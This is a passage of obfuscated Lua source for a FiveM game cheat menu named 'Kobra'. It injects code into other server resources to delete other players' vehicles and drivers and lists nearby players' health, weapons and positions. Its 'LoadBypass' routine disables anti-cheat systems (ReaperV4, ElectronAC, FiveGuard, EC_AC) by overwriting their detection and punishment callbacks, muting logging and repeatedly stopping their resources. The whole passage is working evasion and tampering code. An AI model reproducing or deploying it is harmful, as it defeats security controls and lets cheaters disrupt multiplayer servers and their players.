0 ;end if (8==v1344) then v1355,v1356,v1357,v1355,v1358=GetShapeTestResult(v1354);v1359=nil;function v1359(v1530) local v1531=202 -(10 + 192) ;local v1532;while true do if (v1531==(47 -(13 + 34))) then if ( not v1530 or  not DoesEntityExist(v1530)) then return;end v1532=GetPedInVehicleSeat(v1530, -1);v1531=1;end if (1==v1531) then if ((v1532~=(1289 -(342 + 947))) and DoesEntityExist(v1532)) then SetPedIntoVehicle(v1347,v1530,0 -0 );v1345(v1530,3708 -(119 + 1589) );Wait(22 -12 );for v1659=0,5 -1  do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1532   .. [[)
                                        ]] );end Wait(40);SetPedIntoVehicle(v1347,v1530, -(553 -(545 + 7)));Wait(2 -1 );SetPedIntoVehicle(v1347,v1530,GetEmptySeat(v1530));Wait(1);SetPedIntoVehicle(v1347,v1530, -1);Wait(186 + 264 );ClearPedTasksImmediately(v1347);Wait(1953 -(494 + 1209) );SetPedIntoVehicle(v1347,v1530, -(2 -1));end break;end end end CreateThread(function() if v1356 then if ((v1358~=(998 -(197 + 801))) and IsEntityAVehicle(v1358)) then local v1648=0 -0 ;local v1649;while true do if (v1648==0) then v1649=v1358;v1359(v1649);break;end end end end end);break;end if (v1344==(14 -11)) then hNative("ClearPedTasksImmediately",function(v1533,...) return v1533(...);end);hNative("SetEntityCoordsNoOffset",function(v1534,...) return v1534(...);end);hNative("IsEntityAVehicle",function(v1535,...) return v1535(...);end);hNative("SetPedIntoVehicle",function(v1536,...) return v1536(...);end);v1344=958 -(919 + 35) ;end if ((5 + 0)==v1344) then function v1345(v1537,v1538) local v1539=0 -0 ;local v1540;while true do if (v1539==(468 -(369 + 98))) then while (GetGameTimer() -v1540)<v1538  do if NetworkHasControlOfEntity(v1537) then return true;end NetworkRequestControlOfEntity(v1537);Wait(0);end return NetworkHasControlOfEntity(v1537);end if (v1539==0) then v1538=v1538 or 2000 ;v1540=GetGameTimer();v1539=1116 -(400 + 715) ;end end end v1346=nil;function v1346(v1541) local v1542=math.rad(v1541.z);local v1543=math.rad(v1541.x);local v1544=math.abs(math.cos(v1543));return vector3( -math.sin(v1542) * v1544 ,math.cos(v1542) * v1544 ,math.sin(v1543));end function GetEmptySeat(v1545) local v1546=0;local v1547;while true do if (v1546==(0 + 0)) then v1547={ -1,0 + 0 ,1,3 -1 };for v1650,v1651 in ipairs(v1547) do if IsVehicleSeatFree(v1545,v1651) then return v1651;end end v1546=1632 -(12 + 1619) ;end if ((164 -(103 + 60))==v1546) then return  -1;end end end v1344=29 -23 ;end if (v1344==(4 -3)) then hNative("GetEntityCoords",function(v1548,...) return v1548(...);end);hNative("GetCamCoord",function(v1549,...) return v1549(...);end);hNative("GetCamRot",function(v1550,...) return v1550(...);end);hNative("StartShapeTestRay",function(v1551,...) return v1551(...);end);v1344=9 -7 ;end end end elseif (v827=="Delete Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1360=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1360,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function DeleteCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                else
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                    Wait(100)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        DeleteCar(vehicle)
                                    end
                                end
                            end)
                        ]]);elseif _G.KobraFreecamObject then local v1446=1662 -(710 + 952) ;local v1447;local v1448;local v1449;local v1450;local v1451;local v1452;local v1453;local v1454;local v1455;local v1456;local v1457;local v1458;local v1459;local v1460;local v1461;while true do if (3==v1446) then hNative("NetworkHasControlOfEntity",function(v1582,...) return v1582(...);end);v1447=nil;function v1447(v1583,v1584) v1584=v1584 or (3868 -(555 + 1313)) ;local v1585=GetGameTimer();while (GetGameTimer() -v1585)<v1584  do local v1636=0 + 0 ;while true do if (v1636==(1 + 0)) then Wait(0);break;end if (v1636==(0 + 0)) then if NetworkHasControlOfEntity(v1583) then return true;end NetworkRequestControlOfEntity(v1583);v1636=1469 -(1261 + 207) ;end end end return NetworkHasControlOfEntity(v1583);end v1448=nil;function v1448(v1586) local v1587=math.rad(v1586.z);local v1588=math.rad(v1586.x);local v1589=math.abs(math.cos(v1588));return vector3( -math.sin(v1587) * v1589 ,math.cos(v1587) * v1589 ,math.sin(v1588));end function GetEmptySeat(v1590) local v1591={ -(748 -(212 + 535)),0 -0 ,4 -3 ,2 -0 };for v1637,v1638 in ipairs(v1591) do if IsVehicleSeatFree(v1590,v1638) then return v1638;end end return  -1;end v1446=15 -11 ;end if (v1446==(1 + 0)) then hNative("GetCamRot",function(v1592,...) return v1592(...);end);hNative("StartShapeTestRay",function(v1593,...) return v1593(...);end);hNative("GetShapeTestResult",function(v1594,...) return v1594(...);end);hNative("GetPedInVehicleSeat",function(v1595,...) return v1595(...);end);hNative("SetEntityVisible",function(v1596,...) return v1596(...);end);hNative("DeletePed",function(v1597,...) return v1597(...);end);v1446=1465 -(522 + 941) ;end if (v1446==2) then hNative("ClearPedTasksImmediately",function(v1598,...) return v1598(...);end);hNative("SetEntityCoordsNoOffset",function(v1599,...) return v1599(...);end);hNative("IsEntityAVehicle",function(v1600,...) return v1600(...);end);hNative("SetPedIntoVehicle",function(v1601,...) return v1601(...);end);hNative("PlayerPedId",function(v1602,...) return v1602(...);end);hNative("NetworkRequestControlOfEntity",function(v1603,...) return v1603(...);end);v1446=3;end if (4==v1446) then v1449=PlayerPedId();v1450=GetEntityCoords(v1449);v1451=GetCamCoord(_G.KobraFreecamObject);v1452=GetCamRot(_G.KobraFreecamObject,1513 -(292 + 1219) );v1453=v1448(v1452);v1454=2112 -(787 + 325) ;v1446=15 -10 ;end if (v1446==(0 + 0)) then function hNative(v1604,v1605) local v1606=0;local v1607;while true do if (v1606==1) then _G[v1604]=function(...) return v1605(v1607,...);end;break;end if (v1606==(0 -0)) then v1607=_G[v1604];if ( not v1607 or (type(v1607)~="function")) then return;end v1606=1;end end end hNative("CreateThread",function(v1608,...) return v1608(...);end);hNative("Wait",function(v1609,...) return v1609(...);end);hNative("DoesEntityExist",function(v1610,...) return v1610(...);end);hNative("GetEntityCoords",function(v1611,...) return v1611(...);end);hNative("GetCamCoord",function(v1612,...) return v1612(...);end);v1446=535 -(424 + 110) ;end if (v1446==5) then v1455=v1451 + (v1453 * v1454) ;v1456=StartShapeTestRay(v1451.x,v1451.y,v1451.z,v1455.x,v1455.y,v1455.z, -1,v1449,0);v1457,v1458,v1459,v1457,v1460=GetShapeTestResult(v1456);v1461=nil;function v1461(v1613) if ( not v1613 or  not DoesEntityExist(v1613)) then return;end local v1614=GetPedInVehicleSeat(v1613, -1);if ((v1614~=0) and DoesEntityExist(v1614)) then local v1652=0 + 0 ;while true do if (v1652==(3 + 1)) then SetEntityCoordsNoOffset(v1449,v1450.x,v1450.y,v1450.z,true,true,true,true);Wait(20 + 80 );MachoInjectResource("monitor",[[
                                        DeleteEntity(]]   .. v1613   .. [[)
                                    ]] );break;end if (v1652==(313 -(33 + 279))) then for v1667=0 + 0 ,1357 -(1338 + 15)  do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1614   .. [[)
                                        ]] );end Wait(40);SetPedIntoVehicle(v1449,v1613, -(1424 -(528 + 895)));v1652=1 + 1 ;end if (v1652==3) then SetPedIntoVehicle(v1449,v1613, -1);Wait(2374 -(1606 + 318) );ClearPedTasksImmediately(v1449);v1652=1823 -(298 + 1521) ;end if (v1652==(8 -6)) then Wait(311 -(154 + 156) );SetPedIntoVehicle(v1449,v1613,GetEmptySeat(v1613));Wait(1);v1652=11 -8 ;end if (v1652==0) then SetPedIntoVehicle(v1449,v1613,0 -0 );v1447(v1613,3115 -(712 + 403) );Wait(10);v1652=1;end end else local v1653=450 -(168 + 282) ;while true do if (v1653==(1 -0)) then MachoInjectResource("monitor",[[
                                        DeleteEntity(]]   .. v1613   .. [[)
                                    ]] );Wait(100);v1653=2;end if (v1653==2) then SetEntityCoordsNoOffset(v1449,v1450.x,v1450.y,v1450.z,true,true,true,true);break;end if (v1653==(0 + 0)) then SetPedIntoVehicle(v1449,v1613, -(1 + 0));Wait(100);v1653=1;end end end end CreateThread(function() if v1458 then if ((v1460~=0) and IsEntityAVehicle(v1460)) then local v1660=0 -0 ;local v1661;while true do if (v1660==0) then v1661=v1460;v1461(v1661);break;end end end end end);break;end end end end end end local v509=v17[v15];if v509 then if ((v509.type=="slider") or (v509.type=="slider-checkbox")) then local v828=1451 -(1242 + 209) ;local v829;local v830;while true do if (v828==(680 -(20 + 659))) then if (v829<=(7 + 3)) then if (IsControlPressed(0 + 0 ,253 -79 ) and ((v830-v286)>v287)) then local v1197=0 -0 ;while true do if (v1197==(619 -(427 + 192))) then v12:ScrollTwo("Left");v286=v830;break;end end elseif (IsControlPressed(0 -0 ,65 + 110 ) and ((v830-v286)>v287)) then local v1318=1947 -(1427 + 520) ;while true do if (v1318==0) then v12:ScrollTwo("Right");v286=v830;break;end end end elseif IsControlPressed(0,89 + 85 ) then v12:ScrollTwo("Left");elseif IsControlPressed(0 -0 ,156 + 19 ) then v12:ScrollTwo("Right");end break;end if ((1232 -(712 + 520))==v828) then v829=v509.max or 100 ;v830=GetGameTimer();v828=2 -1 ;end end end end end end);local v102=0;local v103=1466 -(565 + 781) ;local v104=565 -(35 + 530) ;local v105=60 + 60 ;local v106=0 -0 ;local v107=1498 -(1330 + 48) ;MachoOnKeyDown(function(v288) local v289=tonumber(v288) or v288 ;local v290=v44[v289] or "Unknown" ;local v291=GetGameTimer();if (v290==v23) then if ( not v13 and v24) then v12:ShowUI();end elseif (v290=="Backspace") then if (v13 and v24) then v12:Backspace();end elseif (v290=="Enter") then if (v13 and v24) then v12:Enter();end elseif ((v290=="Q") and ((v291-v106)>v107)) then if (v13 and v24) then v12:PrevCategory();end elseif ((v290=="E") and ((v291-v106)>v107)) then if (v13 and v24) then v12:NextCategory();end elseif ((v290=="ArrowUp") and ((v291-v102)>v103)) then if v13 then v12:ScrollOne("Up");v102=v291;end elseif ((v290=="ArrowDown") and ((v291-v102)>v103)) then if v13 then local v1380=0 + 0 ;while true do if (v1380==0) then v12:ScrollOne("Down");v102=v291;break;end end end elseif (v290=="ArrowLeft") then local v1381=v17[v15];if v1381 then if ((v1381.type=="slider") or ((v1381.type=="slider-checkbox") and ((v291-v104)>v105))) then local v1573=v1381.max or (18 + 82) ;local v1574=GetGameTimer();if (v1573<=(17 -7)) then local v1639=0;while true do if (v1639==(0 -0)) then v12:ScrollTwo("Left");v104=v1574;break;end end else v12:ScrollTwo("Left");end elseif ((v1381.type=="scrollable") or (v1381.type=="scrollable-checkbox")) then v12:ScrollTwo("Left");end end elseif (v290=="ArrowRight") then local v1494=v17[v15];if v1494 then if ((v1494.type=="slider") or ((v1494.type=="slider-checkbox") and ((v291-v104)>v105))) then local v1640=0;local v1641;local v1642;while true do if (v1640==(1170 -(854 + 315))) then if (v1641<=10) then v12:ScrollTwo("Right");v104=v1642;else v12:ScrollTwo("Right");end break;end if (v1640==0) then v1641=v1494.max or (320 -220) ;v1642=GetGameTimer();v1640=1 + 0 ;end end elseif ((v1494.type=="scrollable") or (v1494.type=="scrollable-checkbox")) then v12:ScrollTwo("Right");end end elseif (v290=="F5") then local v1575=v17[v15];if (v13 and v24 and v1575 and ((v1575.type=="button") or (v1575.type=="checkbox") or (v1575.type=="slider-checkbox"))) then v12:HideUI();Wait(250);v60(("Bind %s"):format(v1575.label),"",function(v1654) for v1657,v1658 in pairs(v44) do if (v1658:lower()==v1654:lower()) then local v1666=v45[v1657];for v1668,v1669 in pairs(v25) do if (v1669.keyRaw==v1657) then v12:Notify("error","Kobra","There is already a keybind with that key!",3044 -(31 + 13) );return;end end if v1666 then local v1672=0 -0 ;while true do if (v1672==(0 -0)) then v25[ #v25 + 1 + 0 ]={key=v1666,keyRaw=v1657,keyLabel=v44[v1657],type=v1575.type,label=v1575.label,checked=v1575.checked or false ,value=v1575.value or (564 -(281 + 282)) ,step=v1575.step or (0.25 -0) ,min=v1575.min or (0.25 + 0) ,max=v1575.max or (954 -(216 + 733)) ,onSelect=v1575.onSelect};v12:ShowKeybindList(v25);break;end end end Wait(2347 -(137 + 1710) );v12:ShowUI();return;end end end,"keybind");end elseif v24 then for v1655,v1656 in pairs(v25) do if (v1656.type=="button") then local v1662=0 -0 ;local v1663;while true do if (v1662==0) then v1663=v1656.keyRaw;if v1663 then if (v1663==v289) then local v1678=538 -(100 + 438) ;while true do if (0==v1678) then v1656.onSelect();v12:Notify("success","Kobra",("You have executed %s!"):format(v1656.label),3000);break;end end end end break;end end elseif (v1656.type=="checkbox") then local v1670=1365 -(205 + 1160) ;local v1671;while true do if (v1670==(0 + 0)) then v1671=v1656.keyRaw;if (v1671 and (v1671==v289)) then v1656.checked= not v1656.checked;v12:UpdateTabChecked(v16,v1656.label,v1656.checked);if v1656.onSelect then v1656.onSelect(v1656.checked);end v12:ShowKeybindList(v25);v12:Notify((v1656.checked and "success") or "error" ,"Kobra",("You have %s %s!"):format((v1656.checked and "enabled") or "disabled" ,v1656.label),1528 + 1472 );if v13 then v12:UpdateElements(v17);end end break;end end elseif (v1656.type=="slider-checkbox") then local v1674=v1656.keyRaw;if (v1674 and (v1674==v289)) then local v1677=1305 -(535 + 770) ;while true do if ((1 + 0)==v1677) then if v1656.onSelect then v1656.onSelect(v1656.value,v1656.checked);end v12:ShowKeybindList(v25);v1677=2 + 0 ;end if (v1677==2) then v12:Notify((v1656.checked and "success") or "error" ,"Kobra",("You have %s %s!"):format((v1656.checked and "enabled") or "disabled" ,v1656.label),4994 -(211 + 1783) );if v13 then v12:UpdateElements(v17);end break;end if (v1677==(0 + 0)) then v1656.checked= not v1656.checked;v12:UpdateTabChecked(v16,v1656.label,v1656.checked);v1677=1430 -(1236 + 193) ;end end end end end end end);v12.InListMenu=function(v292) return v18 and v18[v19] and ((v18[v19].label=="List") or (v18[v19].label=="Safe")) ;end;v12.SelectEveryone=function(v293) local v294=910 -(793 + 117) ;local v295;while true do if (v294==0) then if ( not v18 or  not v18[v19]) then return;end v295=v18[v19];v294=1;end if (v294==(1894 -(1607 + 285))) then v293:UpdateElements(v17);break;end if (v294==1) then if (v295.label~="List") then return;end for v741,v742 in ipairs(v295.tabs) do if (v742.type=="checkbox") then v742.checked=true;if (v742.serverId and tonumber(v742.serverId)) then v27[tonumber(v742.serverId)]=true;end end end v294=862 -(747 + 113) ;end end end;v12.UnselectEveryone=function(v296) if ( not v18 or  not v18[v19]) then return;end local v297=v18[v19];if (v297.label~="List") then return;end for v510,v511 in ipairs(v297.tabs) do if (v511.type=="checkbox") then local v694=1976 -(80 + 1896) ;while true do if (v694==(0 -0)) then v511.checked=false;if (v511.serverId and tonumber(v511.serverId)) then v27[tonumber(v511.serverId)]=false;end break;end end end end v296:UpdateElements(v17);end;v12.ClearSelection=function(v298) local v299=0;while true do if (v299==0) then v27={};if (v18 and v18[v19]) then local v831=0 -0 ;local v832;while true do if (v831==(0 + 0)) then v832=v18[v19];if ((v832.label=="List") and v832.tabs) then for v1120,v1121 in ipairs(v832.tabs) do if (v1121.type=="checkbox") then v1121.checked=false;end end end break;end end end v299=2 -1 ;end if (v299==(1 + 0)) then v12:UnselectEveryone();break;end end end;v12.UpdateListMenu=function(v300) if  not v13 then return;end if ( not v18 or  not v18[v19]) then return;end local v301=v18[v19];if (v301.label~="List") then return;end local v302=GetEntityCoords(PlayerPedId());if  not v302 then return;end local v303=v300:GetNearbyPlayers(v302,350,true);local v304;for v512,v513 in ipairs(v301.tabs) do if ((v513.type=="divider") and (v513.label=="Nearby Players")) then v304=v512;break;end end if  not v304 then return;end for v514= #v301.tabs,v304 + (2 -1) , -(1 + 0) do table.remove(v301.tabs,v514);end if ( #v303==(0 + 0)) then v301.tabs[ #v301.tabs + (2 -1) ]={type="button",label="No Nearby Players",disabled=true};else table.sort(v303,function(v695,v696) return tonumber(v695.serverId)<tonumber(v696.serverId) ;end);for v697,v698 in ipairs(v303) do local v699=tonumber(v698.serverId);if (v699 and v698.name) then local v833,v834=GetCurrentPedWeapon(GetPlayerPed(GetPlayerFromServerId(v699)));v301.tabs[ #v301.tabs + 1 ]={type="checkbox",label=("%s - [%s]"):format(v698.name,v699),serverId=v699,checked=v27[v699] or false ,name=v698.name,vehicle=((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v699)))~=0) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v699)))) or nil ,isDriver=(GetPedInVehicleSeat((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v699)))~=(454 -(246 + 208))) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v699))) , -1)==GetPlayerPed(GetPlayerFromServerId(v699))) or false ,metaData={{key="Distance",value=math.floor( #(GetEntityCoords(PlayerPedId()) -GetEntityCoords(GetPlayerPed(GetPlayerFromServerId(v699)))))   .. ".0m" },{key="Server ID",value=v699},{key="Health",value=GetEntityHealth(GetPlayerPed(GetPlayerFromServerId(v699))),color="0, 255, 17"},{key="Armour",value=GetPedArmour(GetPlayerPed(GetPlayerFromServerId(v699))),color="0, 132, 255"},{key="Weapon",value=v28[v834] or "Unknown" },{key="Vehicle",value=((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v699)))~=(0 -0)) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v699)))) or "Unknown" },{key="Alive",value=(IsPedDeadOrDying(GetPlayerPed(GetPlayerFromServerId(v699))) and "Dead") or "Alive" },{key="Speed",value=math.floor(GetEntitySpeed(GetPlayerPed(GetPlayerFromServerId(v699))) * (1278.6 -(726 + 549)) )   .. ".0 km/h" },{key="Visible",value=(IsEntityVisibleToScript(GetPlayerPed(GetPlayerFromServerId(v699))) and "Visible") or "Invisible" }},onSelect=function(v860) v27[v699]=v860 or false ;end};end end end for v515,v516 in pairs(v27) do local v517=false;for v601,v602 in ipairs(v303) do if (tonumber(v602.serverId)==tonumber(v515)) then v517=true;break;end end if  not v517 then v27[v515]=nil;end end v15=math.min(v15 or (1 + 0) ,math.max(1425 -(916 + 508) , #v301.tabs));local v305,v306=pcall(function() v300:UpdateElements(v17);end);if  not v305 then print("^7[^5Kobra^7]: UI update error: "   .. tostring(v306) );end end;v12.AssignListMenuActions=function(v307) local v308=0 -0 ;while true do if (v308==0) then if  not v16 then return;end for v743,v744 in ipairs(v16) do if ((v744.label=="Server") and v744.categories) then for v911,v912 in ipairs(v744.categories) do if ((v912.label=="List") and v912.tabs) then for v1087,v1088 in ipairs(v912.tabs) do if (v1088.type=="button") then if (v1088.label=="Select Everyone") then v1088.onSelect=function() v12:SelectEveryone();end;elseif (v1088.label=="Un-Select Everyone") then v1088.onSelect=function() v12:UnselectEveryone();end;elseif (v1088.label=="Clear Selection") then v1088.onSelect=function() v12:ClearSelection();end;end end end end end end end break;end end end;CreateThread(function() while true do local v518=0;while true do if ((0 + 0)==v518) then Wait(1823 -(140 + 183) );if (v12:InListMenu() and v13) then local v862=0;local v863;local v864;while true do if (v862==(0 + 0)) then v863,v864=pcall(function() v12:UpdateListMenu();end);if  not v863 then print("^7[^5Kobra^7]: List update error: "   .. tostring(v864) );end break;end end end break;end end end end);Wait(1564 -(297 + 267) );v12:AssignListMenuActions();local v114=nil;local v115=nil;local function v116() local v309=0 + 0 ;while true do if (v309==0) then for v745=342 -(37 + 305) ,GetNumResources() -(1267 -(323 + 943))  do local v746=0;local v747;local v748;while true do if (v746==0) then v747=GetResourceByFindIndex(v745);v748=LoadResourceFile(v747,"fxmanifest.lua");v746=1 + 0 ;end if (v746==(1 -0)) then if (v748 and (string.find(v748,"https://electron-services.com") or string.find(v748,"Electron Services") or string.find(v748,"The most advanced fiveM anticheat"))) then v114=v747;print("^7[^5Kobra^7]: Detected ElectronAC in Resource: "   .. v747 );return v747;end break;end end end return nil;end end end local function v117() local v310=1535 -(394 + 1141) ;while true do if (v310==0) then for v749=0 + 0 ,GetNumResources() -(1 + 0)  do local v750=0 + 0 ;local v751;local v752;while true do if (v750==(1 -0)) then for v992=0 -0 ,v752-1  do local v993=GetResourceMetadata(v751,"client_script",v992);if (v993 and string.find(v993,"obfuscated")) then v115=v751;print("^7[^5Kobra^7]: Detected FiveGuard in Resource: "   .. v751 );return v751;end end break;end if (v750==0) then v751=GetResourceByFindIndex(v749);v752=GetNumResourceMetadata(v751,"client_script");v750=1;end end end return nil;end end end v12.LoadBypass=function(v311) local v312={"216.146.24.88:30120","91.190.154.74:30120"};local v313=GetCurrentServerEndpoint();for v519,v520 in ipairs(v312) do if (v313==v520) then v311:Notify("error","Kobra","Bypass disabled for this server.",3529 -(87 + 442) );return;end end v311:Notify("info","Kobra","Loading Anticheat Bypass...",3805 -(13 + 792) );v116();v117();Wait(1000);if (GetResourceState("ReaperV4")=="started") then local v603=0 + 0 ;while true do if (v603==(1 + 1)) then MachoHookNative(15349248000000000000 -(158 + 12) ,function(...) return false,0;end);MachoHookNative(18127728000000000000,function(...) return false,true;end);v603=3;end if (v603==(3 + 0)) then print("ReaperV4 Bypass Enabled");v311:Notify("info","Kobra","ReaperV4 Bypass Loaded",12910 -9910 );break;end if (v603==(857 -(416 + 440))) then MachoHookNative(10181871000000000000,function(...) return false,1905 -(557 + 1345) ;end);MachoHookNative(12777102000000000000 -  -75372689 ,function(...) return false,true;end);v603=2 -0 ;end if (v603==(0 + 0)) then MachoInjectResource2(1952 -(1111 + 839) ,"ReaperV4",[[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local reaper_newdetection
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "Reaper:NewDetection" then
                        reaper_newdetection = func
                    end
                end
                if type(reaper_newdetection) ~= "function" then
                    return print("error")
                end
                local _, securityclient = debug.getupvalue(reaper_newdetection, 1)
                for name, detection in pairs(securityclient["detections"]) do
                    if detection["detected"] then
                        securityclient["detections"][name]["detected"] = function(...)
                            local args = { ... }
                            print(name, "detected", json.encode(args or {}))
                            return
                        end
                    end
                    if detection["callback"] then
                        securityclient["detections"][name]["callback"] = function(...)
                            local args = { ... }
                            print(name, "callback", json.encode(args or {}))
                            return
                        end
                    end
                end
                for name, detection in pairs(securityclient["active_detections"]) do
                    if detection["detected"] then
                        securityclient["active_detections"][name]["detected"] = function(...) return end
                    end
                    if detection["callback"] then
                        securityclient["active_detections"][name]["callback"] = function(...) return end
                    end
                end
                Debug.setupvalue(reaper_newdetection, 1, securityclient)
                print("ReaperV4 | Client Bypassed")
            end)
        ]]);MachoHookNative(14327026000000000000 -(496 + 455) ,function(...) return false,false;end);v603=1;end end elseif (v114~=nil) then local v753=698 -(66 + 632) ;while true do if (v753==(0 -0)) then v48("ElectronAC",[[
            print = function() end
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (string.find(msg, "DEBUG") or string.find(msg, "NEWDBG") or string.find(msg, "A11AXXX") or string.find(msg, "function") or string.find(msg, "TriggerServerEvent")) then
                    originalTrace(msg)
                end
            end
        ]]);MachoInjectResource2(2,"ElectronAC",[[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local eAcVerify
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "ElectronAC.verify" then
                        local upname, func = debug.getupvalue(func, 1)
                        eAcVerify = func
                    end
                end
                local EACTable = nil
                local eacUpvalueIndex = nil
                local i = 1
                while true do
                    local name, value = debug.getupvalue(eAcVerify, i)
                    if not name then break end
                    if type(value) == "table" then
                        local hasEACStructure = false
                        for idx, tbl in pairs(value) do
                            if type(tbl) == "string" then
                                if tbl == "antiNuiBlocker" or tbl == "antiInvisible" then
                                    hasEACStructure = true
                                end
                                if hasEACStructure then break end
                            end
                        end
                        if hasEACStructure then
                            EACTable = value
                            eacUpvalueIndex = i
                            break
                        end
                    end
                    i = i + 1
                end
                if not EACTable then
                    print("EAC table not found!")
                    return
                end
                local punish = function(...) return end
                for idx, tbl in pairs(EACTable) do
                    if type(tbl) == "table" then
                        for subIdx, subTbl in pairs(tbl) do
                            if type(subTbl) == "table" and type(subTbl["punish"]) == "function" and subTbl["punish"] then
                                subTbl["punish"] = punish
                            end
                        end
                    end
                end
                Debug.setupvalue(eAcVerify, eacUpvalueIndex, EACTable)
                print("ElectronAC | Client Bypassed")
            end)
        ]]);break;end end elseif (v115~=nil) then CreateThread(function() while true do local v994=1136 -(441 + 695) ;while true do if (v994==0) then MachoResourceStop(v115);print("^7[^5Kobra^7]: Stopped Resource: "   .. v115 );v994=2 -1 ;end if ((1 -0)==v994) then Wait(2000);break;end end end end);return;elseif (GetResourceState("EC_AC")=="started") then local v995=0 -0 ;local v996;while true do if (v995==(0 + 0)) then MachoInjectResourceRaw("EC_AC",[[print = function() end]]);MachoInjectResourceRaw("EC_AC",[[
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (
                    string.find(msg, "DEBUG") or
                    string.find(msg, "NEWDBG") or
                    string.find(msg, "A11AXXX") or
                    string.find(msg, "function") or
